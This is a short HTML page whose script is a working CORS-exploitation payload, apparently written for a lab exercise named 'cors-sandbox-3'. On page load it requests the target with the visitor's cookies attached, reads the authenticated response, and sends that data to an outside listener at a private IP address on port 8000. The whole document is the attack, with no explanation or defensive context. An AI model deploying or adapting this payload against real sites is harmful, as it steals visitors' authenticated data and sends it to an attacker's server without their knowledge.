<html>
<head>
<script>
var url = "https://cors-sandbox-3/exercise1";

function get_code() {
  fetch(url, {
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    fetch("http://192.168.45.169:8000/data?" + encodeURIComponent(JSON.stringify(data)), {mode:'no-cors'})
  });
}

get_code();
</script>
</head>
<body></body>
</html>
